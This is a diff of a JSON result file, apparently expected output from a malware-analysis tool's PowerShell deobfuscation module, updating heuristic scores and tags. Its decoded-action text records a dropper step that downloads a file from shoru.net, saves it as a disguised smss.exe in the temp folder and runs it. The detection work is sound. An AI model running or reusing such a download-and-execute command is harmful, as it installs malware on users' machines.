@@ -1,16 +1,41 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 122,
+    "score": 1022,
     "sections": [
       {
         "auto_collapse": false,
-        "body": "[Invoke-WebRequest] Download from: -outf %tmp%\\\\smss.exe https://shoru.net/db/main_db\n\n[start] %tmp%\\\\smss.exe\n",
+        "body": "[Invoke-WebRequest] Download From: https://shoru.net/db/main_db --> Save To: %tmp%\\\\smss.exe\n\n[start] %tmp%\\\\smss.exe\n",
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
-        "heuristic": null,
-        "tags": {},
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 500,
+          "score_map": {},
+          "signatures": {
+            "suspicious_behaviour_combo_url": 1
+          }
+        },
+        "tags": {
+          "file": {
+            "path": [
+              "%tmp%\\\\smss.exe"
+            ]
+          },
+          "network": {
+            "dynamic": {
+              "domain": [
+                "shoru.net"
+              ],
+              "uri": [
+                "https://shoru.net/db/main_db"
+              ]
+            }
+          }
+        },
         "title_text": "Actions detected with PSDecode",
         "zeroize_on_tag_safe": false
       },
@@ -111,16 +136,16 @@
           "attack_ids": [],
           "frequency": 1,
           "heur_id": 3,
-          "score": 100,
+          "score": 500,
           "score_map": {
-            "Malicious Behaviour Combo": 100
+            "Suspicious Behaviour Combo": 500
           },
           "signatures": {
-            "Malicious Behaviour Combo": 1
+            "Suspicious Behaviour Combo": 1
           }
         },
         "tags": {},
-        "title_text": "Signature: Malicious Behaviour Combo",
+        "title_text": "Signature: Suspicious Behaviour Combo",
         "zeroize_on_tag_safe": false
       },
       {
@@ -200,12 +225,35 @@
         "attack_ids": [],
         "heur_id": 3,
         "signatures": [
-          "Malicious Behaviour Combo"
+          "Suspicious Behaviour Combo"
+        ]
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 5,
+        "signatures": [
+          "suspicious_behaviour_combo_url"
         ]
       }
     ],
     "tags": {
+      "file.path": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "%tmp%\\\\smss.exe"
+        }
+      ],
       "network.dynamic.domain": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "shoru.net"
+        },
         {
           "heur_id": 1,
           "signatures": [],
@@ -213,6 +261,13 @@
         }
       ],
       "network.dynamic.uri": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "suspicious_behaviour_combo_url"
+          ],
+          "value": "https://shoru.net/db/main_db"
+        },
         {
           "heur_id": 1,
           "signatures": [],
